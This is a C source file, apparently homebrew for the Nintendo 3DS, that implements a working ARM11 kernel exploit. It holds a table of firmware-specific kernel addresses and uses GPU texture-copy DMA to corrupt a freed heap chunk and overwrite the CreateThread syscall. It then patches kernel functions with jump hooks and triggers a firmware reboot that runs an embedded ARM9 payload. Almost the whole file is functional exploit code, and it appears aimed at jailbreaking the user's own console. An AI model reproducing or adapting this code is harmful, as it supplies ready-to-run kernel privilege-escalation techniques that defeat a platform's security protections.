#include <3ds.h>
#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <malloc.h>
#include <dirent.h>

#include "payload_bin.h"

unsigned int patch_addr;
unsigned int svc_patch_addr;
unsigned int reboot_patch_addr;
unsigned int trigger_func_addr;
unsigned int jump_table_addr;
unsigned int jump_table_phys_addr = 0x1FFF4C80;
unsigned int func_patch_addr;
unsigned int func_patch_return;
unsigned int fcram_addr;
unsigned int pdn_regs;
unsigned int pxi_regs;
unsigned char patched_svc = 0;
unsigned int kversion;

unsigned char *framebuff_top_0;
unsigned char *framebuff_top_1;

u8 isN3DS = 0;
u8 backupHeap = 0;
u32 *backup;

unsigned int *arm11_buffer;
extern void* jump_table asm("jump_table");
extern void* pdn_regs_0 asm("pdn_regs_0");
extern void* pxi_regs_0 asm("pxi_regs_0");
extern void* return_location asm("return_location");
extern void* reboot_wait asm("reboot_wait");
extern void* end_jump_table asm("end_jump_table");

// Uncomment to have progress printed w/ printf
//#define DEBUG_PROCESS

#define dbg_log(...) dbg_log(__VA_ARGS__)
#ifdef DEBUG_PROCESS
#else
#define dbg_log(...)
#endif

static void *memcpy32(void *dst, const void *src, size_t n)
{
	int32_t *p;

	p = dst;

	if (dst == NULL || src == NULL)
		return p;

	while (n) {
		*p = *(int32_t *)src;
		p++;
		src++;
		n -= sizeof(int32_t);
	}

	return dst;
}

static void synci()
{
	__asm__ volatile(
		"mcr p15, 0, r0, c7, c10, 5\n"
		"mcr p15, 0, r0, c7, c5, 4\n"
		::: "r0");
}

int do_gshax_copy(void *dst, void *src, unsigned int len)
{
	unsigned int check_mem = linearMemAlign(0x10000, 0x40);
	int i = 0;

	// Sometimes I don't know the actual value to check (when copying from unknown memory)
	// so instead of using check_mem/check_off, just loop "enough" times.
	for (i = 0; i < 5; ++i) {
		GSPGPU_FlushDataCache(NULL, src, len);
		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
		GSPGPU_FlushDataCache(NULL, check_mem, 16);
		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
	}

	linearFree(check_mem);

	return 0;
}

void build_nop_slide(u32* dst, unsigned int len)
{
	int i;
	for (i = 0; i < len; i++)
		dst[i] = 0xE1A00000; // ARM NOP instruction

	dst[i-1] = 0xE12FFF1E; // ARM BX LR instruction
}

int get_version_specific_addresses()
{
	// get proper patch address for our kernel -- thanks yifanlu once again
	kversion = *(unsigned int *)0x1FF80000; // KERNEL_VERSION register

	patch_addr = 0;
	svc_patch_addr = 0;

	APT_CheckNew3DS(NULL, &isN3DS);
	isN3DS = isN3DS && kversion >= 0x022C0600;

	jump_table_phys_addr = 0x1FFF4C80;

	if(!isN3DS || kversion < 0x022C0600)
	{
		switch (kversion)
		{
			case 0x02220000: // 2.34-0 4.1.0
				patch_addr = 0xEFF83C97;
				svc_patch_addr = 0xEFF827CC;
				reboot_patch_addr = 0xEFFF497C;
				trigger_func_addr = 0xFFF748C4;
				jump_table_addr = 0xEFFF4C80;
				fcram_addr = 0xF0000000;
				func_patch_addr = 0xEFFE4DD4;
				func_patch_return = 0xFFF84DDC;
				pdn_regs = 0xFFFD0000;
				pxi_regs = 0xFFFD2000;
			break;
			case 0x02230600: // 2.35-6 5.0.0
				patch_addr = 0xEFF8372F;
				svc_patch_addr = 0xEFF822A8;
				reboot_patch_addr = 0xEFFF4978;
				trigger_func_addr = 0xFFF64B94;
				jump_table_addr = 0xEFFF4C80;
				fcram_addr = 0xF0000000;
				func_patch_addr = 0xEFFE55BC;
				func_patch_return = 0xFFF765C4;
				pdn_regs = 0xFFFD0000;
				pxi_regs = 0xFFFD2000;
			break;
			case 0x02240000: // 2.36-0 5.1.0
				trigger_func_addr = 0xFFF64B90;
				func_patch_addr = 0xEFFE55B8;
				func_patch_return = 0xFFF765C0;
				pdn_regs = 0xFFFD0000;
				pxi_regs = 0xFFFD2000;
				patch_addr = 0xEFF8372B;
				svc_patch_addr = 0xEFF822A4;
				reboot_patch_addr = 0xEFFF4978;
				jump_table_addr = 0xEFFF4C80;
				fcram_addr = 0xF0000000;
			break;
			case 0x02250000: // 2.37-0 6.0.0
			case 0x02260000: // 2.38-0 6.1.0
				patch_addr = 0xEFF8372B;
				svc_patch_addr = 0xEFF822A4;
				reboot_patch_addr = 0xEFFF4978;
				trigger_func_addr = 0xFFF64A78;
				func_patch_addr = 0xEFFE5AE8;
				func_patch_return = 0xFFF76AF0;
				pdn_regs = 0xFFFD0000;
				pxi_regs = 0xFFFD2000;
				jump_table_addr = 0xEFFF4C80;
				fcram_addr = 0xF0000000;
			break;
			case 0x02270400: // 2.39-4 7.0.0
				patch_addr = 0xEFF8372F;
				svc_patch_addr = 0xEFF822A8;
				reboot_patch_addr = 0xEFFF4978;
				trigger_func_addr = 0xFFF64AB0;
				jump_table_addr = 0xEFFF4C80;
				fcram_addr = 0xF0000000;
				func_patch_addr = 0xEFFE5B34;
				func_patch_return = 0xFFF76B3C;
				pdn_regs = 0xFFFD0000;
				pxi_regs = 0xFFFD2000;
			break;
			case 0x02280000: // 2.40-0 7.2.0
				patch_addr = 0xEFF8372B;
				svc_patch_addr = 0xEFF822A4;
				reboot_patch_addr = 0xEFFF4974;
				trigger_func_addr = 0xFFF54BAC;
				jump_table_addr = 0xEFFF4C80;
				fcram_addr = 0xF0000000;
				func_patch_addr = 0xEFFE5B30;
				func_patch_return = 0xFFF76B38;
				pdn_regs = 0xFFFD0000;
				pxi_regs = 0xFFFD2000;
			break;
			case 0x022C0600: // 2.44-6 8.0.0
				patch_addr = 0xDFF83767;
				svc_patch_addr = 0xDFF82294;
				reboot_patch_addr = 0xDFFF4974;
				trigger_func_addr = 0xFFF54BAC;
				jump_table_addr = 0xDFFF4C80;
				fcram_addr = 0xE0000000;
				func_patch_addr = 0xDFFE4F28;
				func_patch_return = 0xFFF66F30;
				pdn_regs = 0xFFFBE000;
				pxi_regs = 0xFFFC0000;
			break;
			case 0x022E0000: // 2.26-0 9.0.0
				patch_addr = 0xDFF83837;
				svc_patch_addr = 0xDFF82290;
				reboot_patch_addr = 0xEFFF4974;
				trigger_func_addr = 0xFFF151C0;
				jump_table_addr = 0xDFFF4C80;
				fcram_addr = 0xE0000000;
				func_patch_addr = 0xDFFE59D0;
				func_patch_return = 0xFFF279D8;
				pdn_regs = 0xFFFC2000;
				pxi_regs = 0xFFFC4000;
			break;
			default:
#ifdef DEBUG_PROCESS
				dbg_log("Unrecognized kernel version %x, returning...\n", kversion);
#endif
				return 0;
			break;
		}
	}
	else
	{
		switch (kversion)
		{
			case 0x022C0600: // N3DS 2.44-6 8.0.0
			case 0x022E0000: // N3DS 2.26-0 9.0.0
				patch_addr = 0xDFF8382F;
				svc_patch_addr = 0xDFF82260;
				dbg_log("Insufficient information for ARM9, returning... %i\n", kversion);
			break;
			default:
#ifdef DEBUG_PROCESS
				dbg_log("Unrecognized kernel version %x, returning... %i\n", kversion);
#endif
				return 0;
			break;
		}
	}

	dbg_log("Kernel Version:    0x%08X\n", kversion);
	dbg_log("CreateThread Addr: 0x%08X\n", patch_addr);
	dbg_log("SVC Addr:          0x%08X\n", svc_patch_addr);
	return 1;
}

int arm11_kernel_exploit_setup(void)
{
	get_version_specific_addresses();

	// Part 1: corrupt kernel memory
	u32 mem_hax_mem;
	svcControlMemory(&mem_hax_mem, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);
	u32 mem_hax_mem_free = mem_hax_mem + 0x1000;

	dbg_log("Freeing memory\n");
    u32 tmp_addr;
	svcControlMemory(&tmp_addr, mem_hax_mem_free, 0, 0x1000, MEMOP_FREE, 0); // free page 

	dbg_log("Backing up heap area\n");
	do_gshax_copy(arm11_buffer, mem_hax_mem_free, 0x20u);

	u32 saved_heap[8];
	memcpy(saved_heap, arm11_buffer, sizeof(saved_heap));

	arm11_buffer[0] = 1;
	arm11_buffer[1] = patch_addr;
	arm11_buffer[2] = 0;
	arm11_buffer[3] = 0;

	// Overwrite free pointer
	dbg_log("Overwriting free pointer 0x%08X\n", mem_hax_mem);
	do_gshax_copy(mem_hax_mem_free, arm11_buffer, 0x10u);

    // Trigger write to kernel
	svcControlMemory(&tmp_addr, mem_hax_mem, 0, 0x1000, MEMOP_FREE, 0);
	dbg_log("Triggered kernel write\n");

	memcpy(arm11_buffer, saved_heap, sizeof(saved_heap));
	dbg_log("Restoring heap\n");
	do_gshax_copy(mem_hax_mem, arm11_buffer, 0x20u);
	synci();

	return 1;
}


void test(void)
{
	arm11_buffer[0] = 0xFAAFFAAF;
}

//Tells us exactly where we are in firmlaunch hax and where we fail, without using printf
int dotNum = 0;
void dot()
{
	framebuff_top_0[dotNum] = 0xFF;
	framebuff_top_1[dotNum] = 0xFF;
	dotNum += 6;
}

int __attribute__((naked))
arm11_firmlaunch_hax(void)
{
	asm volatile ("add sp, sp, #8 \t\n");
	asm volatile ("clrex");

	dot();

     arm11_buffer[0] = 0xFA0FFA0F;
	int (*trigger_func)(int, int, int, int) = trigger_func_addr;
	dot();

	framebuff_top_0[7] = 0xFF;
	framebuff_top_1[7] = 0xFF;

	dot();

	// ARM9 code copied to FCRAM 0x23F00000
	memcpy32(fcram_addr + 0x3F00000, payload_bin, payload_bin_size);

	dot();

	// write function hook at 0xFFFF0C80
	memcpy32(jump_table_addr, &jump_table, (&end_jump_table - &jump_table + 1) * 4);
	//dbg_log("%x = %x\n", jump_table_addr, *(u32*)jump_table_addr);

	dot();

	// write FW specific offsets to copied code buffer
	//dbg_log("%x = %x\n", jump_table_addr + 0x68, *(u32*)(jump_table_addr + 0x68));
	*(int *)(jump_table_addr + (&pdn_regs_0 - &jump_table)*4) = pdn_regs; // PDN regs
	*(int *)(jump_table_addr + (&pxi_regs_0 - &jump_table)*4) = pxi_regs; // PXI regs
	*(int *)(jump_table_addr + (&return_location - &jump_table)*4) = func_patch_return; // where to return to from hook
	//dbg_log("%x = %x\n", jump_table_addr + 0x68, *(u32*)(jump_table_addr + 0x68));

	dot();

	// patch function 0xFFF84D90 to jump to our hook
	*(int *)(func_patch_addr + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
	*(int *)(func_patch_addr + 4) = 0xFFFF0C80; // jump_table + 0

	dot();

	// patch reboot start function to jump to our hook
	*(int *)(reboot_patch_addr + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
	*(int *)(reboot_patch_addr + 4) = 0x1FFF4C80 + (&reboot_wait - &jump_table)*4; // jump_table + 4

	framebuff_top_0[42+1] = 0xFF;
	framebuff_top_1[42+1] = 0xFF;
	dotNum += 6;

	synci();

	framebuff_top_0[48+2] = 0xFF;
	framebuff_top_1[48+2] = 0xFF;
	dotNum += 6;

	trigger_func(0, 0, 2, 0); // trigger reboot
	while(1){}

	return 0;

	asm volatile ("movs r0, #0      \t\n"
				  "ldr pc, [sp], #4 \t\n");
}

bool doARM11Hax()
{
	int result = 0;
	int i;

	arm11_buffer = linearMemAlign(0x10000, 0x10000);

	// wipe memory for debugging purposes
	for (i = 0; i < 0x1000/4; i++)
		arm11_buffer[i] = 0xdeadbeef;

	framebuff_top_0 = gfxGetFramebuffer(GFX_BOTTOM, GFX_LEFT, NULL, NULL);
	gfxSwapBuffers();
	framebuff_top_1 = gfxGetFramebuffer(GFX_BOTTOM, GFX_LEFT, NULL, NULL);
	dbg_log("Framebuffers at %x and %x\n", framebuff_top_0, framebuff_top_1);
	dbg_log("Jump table payload is 0x%x bytes long\n", (&end_jump_table - &jump_table + 1) * 4);
	dbg_log("Jump table vars 0x%x after jump table\n", (&pdn_regs_0 - &jump_table)*4);
	dbg_log("Reboot wait at %x\n", 0x1FFF4C80 + (&reboot_wait - &jump_table)*4);

	if (arm11_kernel_exploit_setup())
	{
		dbg_log("Kernel exploit set up\n");

		asm volatile ("ldr r0, =%0\t\n"
			"svc 8 \t\n" // CreateThread syscall, corrupted, args not needed
			:: "i"(arm11_firmlaunch_hax)
			: "r0");
		dbg_log("ARM11 code passed somehow, ARM9 failed...\n");
	}

    dbg_log("Kernel exploit set up failed!\n\n");
	return false;
}
